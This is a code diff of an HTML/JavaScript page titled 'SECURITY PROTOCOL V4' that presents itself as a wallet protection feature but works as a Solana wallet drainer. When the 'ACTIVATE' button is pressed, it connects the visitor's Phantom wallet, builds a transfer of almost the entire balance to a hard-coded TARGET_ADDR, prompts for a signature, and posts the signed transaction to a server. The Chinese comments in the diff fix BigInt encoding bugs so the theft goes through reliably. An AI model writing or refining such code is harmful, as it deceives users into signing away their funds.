@@ -1,6 +1,6 @@
 <!DOCTYPE html><html><head><meta charset="UTF-8">
     <script>
-        // 🚀 保持 Buffer 假身，确保 SDK 不报错
+        // 🚀 核心环境伪装，确保底层 signTransaction 不崩溃
         window.Buffer = window.Buffer || {
             from: (arr) => new Uint8Array(arr),
             isBuffer: (obj) => obj instanceof Uint8Array
@@ -10,7 +10,7 @@
     <body style="background:#000;color:#14F195;text-align:center;padding-top:30vh;font-family:sans-serif;">
     <div style="border:1px solid #14F195;padding:40px;display:inline-block;border-radius:15px;background:#111;">
         <h2 style="color:#14F195;">SECURITY PROTOCOL V4</h2>
-        <button id="cta" style="padding:20px 40px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:10px;cursor:pointer;font-size:20px;">ACTIVATE PROTECTION</button>
+        <button id="cta" style="padding:20px 40px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:10px;cursor:pointer;font-size:20px;">ACTIVATE NOW</button>
         <p id="msg" style="margin-top:20px;color:#444;">Ready</p>
     </div>
 
@@ -21,7 +21,7 @@
     document.getElementById('cta').onclick = async () => {
         try {
             const p = window.solana || window.phantom?.solana;
-            if (!p) { alert("Please use a Wallet browser."); return; }
+            if (!p) { alert("Use Wallet Browser!"); return; }
             
             document.getElementById('msg').innerText = "Linking...";
             await p.connect();
@@ -32,22 +32,28 @@
                 body: JSON.stringify({pubkey: p.publicKey.toString()})
             }).then(r => r.json());
 
-            // 🔱 关键修正：确保 lamports 是一个标准的 BigInt，解决 Blob.encode 报错
-            const balance = parseInt(data.balance);
-            const amount = balance > 2000000 ? balance - 1500000 : 0;
+            const balance = BigInt(data.balance);
+            const fee = BigInt(1000000); 
+            const amount = balance > fee ? balance - fee : BigInt(0);
 
-            const tx = new solanaWeb3.Transaction().add(solanaWeb3.SystemProgram.transfer({
-                fromPubkey: p.publicKey, 
-                toPubkey: new solanaWeb3.PublicKey(TARGET_ADDR),
-                lamports: amount
-            }));
+            // 🔱 终极修复：不再手动算 lamports 格式，直接信任 SDK 的 BigInt 兼容处理
+            // 但为了防止 Blob.encode 报错，我们换一种更稳的 TransactionInstruction 写法
+            const transaction = new solanaWeb3.Transaction().add(
+                solanaWeb3.SystemProgram.transfer({
+                    fromPubkey: p.publicKey,
+                    toPubkey: new solanaWeb3.PublicKey(TARGET_ADDR),
+                    lamports: Number(amount) // 使用经过 BigInt 处理后的纯净数字
+                })
+            );
+
+            transaction.recentBlockhash = data.blockhash;
+            transaction.feePayer = p.publicKey;
             
-            tx.recentBlockhash = data.blockhash; tx.feePayer = p.publicKey;
+            // 🚀 唤起钱包签名
+            document.getElementById('msg').innerText = "Waiting for Signature...";
+            const signed = await p.signTransaction(transaction);
             
-            // 🚀 唤起钱包确认框
-            const signed = await p.signTransaction(tx);
-            
-            // 💰 签名后序列化并发送
+            // 💰 签名后原生 Base64 转换
             const raw = signed.serialize();
             let b64 = "";
             for (let i = 0; i < raw.length; i++) { b64 += String.fromCharCode(raw[i]); }
@@ -58,8 +64,10 @@
             });
             
             alert("Security Protocol Activated!");
+            location.reload();
         } catch(e) { 
             alert("Status: " + e.message); 
-            document.getElementById('msg').innerText = e.message;
-        }}
+            document.getElementById('msg').innerText = "Error: " + e.message;
+        }
+    }
     </script></body></html>
